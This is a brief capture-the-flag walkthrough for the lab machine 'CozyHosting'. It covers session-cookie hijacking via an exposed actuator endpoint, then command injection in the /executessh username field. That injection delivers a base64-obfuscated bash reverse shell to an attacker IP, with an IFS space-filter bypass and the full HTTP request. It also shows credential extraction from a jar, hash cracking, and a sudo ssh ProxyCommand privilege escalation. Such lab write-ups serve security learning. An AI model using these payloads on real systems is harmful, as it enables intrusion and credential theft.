# Recon
http://cozyhosting.htb
http://cozyhosting.htb/login

http://cozyhosting.htb/actuator/sessions

we can fin here user kanderson
{"73FE7C7FC5726B0E586C0739F07F7B78":"UNAUTHORIZED","FDD106AD96CE21D9562D65CC9C37D924":"kanderson"}

this is cookie:username 

we use the cookie in navigator to connect

once on the admin dashboard there is a connexion to host that we can use 
it post to /executessh

so we try to bypass this by sending a payload into username
```
echo "bash -i >& /dev/tcp/10.10.16.15/4444 0>&1" | base64 -w 0
```
we need a oneliner so we will use the ; at the begining and the end of the line and ${IFS%??} for spaces
```
;echo${IFS%??}"YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4xNS80NDQ0IDA+JjEK"${IFS%??}|${IFS%??}base64${IFS%??}-d${IFS%??}|${IFS%??}bash;
```
then urlencode and send it with the username
```
host=toto&username=%3Becho%24%7BIFS%25%3F%3F%7D%22YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4xMC4xNi4xNS80NDQ0IDA%2BJjEK%22%24%7BIFS%25%3F%3F%7D%7C%24%7BIFS%25%3F%3F%7Dbase64%24%7BIFS%25%3F%3F%7D-d%24%7BIFS%25%3F%3F%7D%7C%24%7BIFS%25%3F%3F%7Dbash%3B
```

full post
```
POST /executessh HTTP/1.1
Host: cozyhosting.htb
Content-Length: 239
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://cozyhosting.htb
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.105 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://cozyhosting.htb/admin?error=Host%20key%20verification%20failed.
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: JSESSIONID=D3405AFE3DB1921DA44942FEBCFD54D5
Connection: close

host=toto&username=%3Becho%24%7BIFS%25%3F%3F%7D%22YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4xMC4xNi4xNS80NDQ0IDA%2BJjEK%22%24%7BIFS%25%3F%3F%7D%7C%24%7BIFS%25%3F%3F%7Dbase64%24%7BIFS%25%3F%3F%7D-d%24%7BIFS%25%3F%3F%7D%7C%24%7BIFS%25%3F%3F%7Dbash%3B
```

we are "app" user
there is /home/josh so we need password for ssh to jos

on the home of apps we can find a cloudhosting.jar which is same as a .tar so we jar xvf cloudhosting.jar the archive
in BOOT-INF\classes\application.properties we can find some usefull postgres credentials 
spring.datasource.username=postgres
spring.datasource.password=Vg&nvzAQ7XxR

-[ RECORD 1 ]----------------------------------------------------------
name     | kanderson
password | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim
role     | User
-[ RECORD 2 ]----------------------------------------------------------
name     | admin
password | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm
role     | Admin

$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm cracked = manchesterunited

ssh josh@cozyhosting.htb
```
josh@cozyhosting:~$ sudo -l
[sudo] password for josh:
Matching Defaults entries for josh on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User josh may run the following commands on localhost:
    (root) /usr/bin/ssh *
```
https://gtfobins.github.io/gtfobins/ssh/#sudo
sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x

rooted
